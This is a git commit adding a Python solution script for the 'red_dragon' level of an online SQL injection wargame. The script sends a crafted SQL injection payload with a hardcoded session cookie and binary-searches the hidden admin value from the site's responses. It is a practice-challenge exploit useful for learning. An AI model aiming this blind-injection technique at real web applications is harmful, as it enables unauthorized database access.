4b4c53c1efa7ee63fc222585d59a8b5d6a25830e
dannytzoc <62925225+dannytzoc@users.noreply.github.com>
2023-12-01 20:14:44 -0800

    Create red_dragon.py

---
+++ red_dragon.py
@@ -0,0 +1,27 @@
+import requests
+
+def sqli(size):
+    url = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
+    cookies = {'PHPSESSID': 'p3fcggsfr1llcdqk1a0164ag5p'}
+    parameter = f'?id=%27||no>%23&no=%0a{size}'
+
+    response = requests.get(url + parameter, cookies=cookies)
+
+    return "Hello admin" in response.text
+
+def binary_search(start, end):
+    while start <= end:
+        mid = (start + end) // 2
+        #print('This is mid ',str(mid))
+        if sqli(mid):
+            start = mid + 1
+            print('This is start ',str(start))
+        else:
+            end = mid - 1
+            print('This is end ',str(end))
+
+    return end
+
+if __name__ == '__main__':
+    result = binary_search(100000000, 1000000000)
+    print(result)
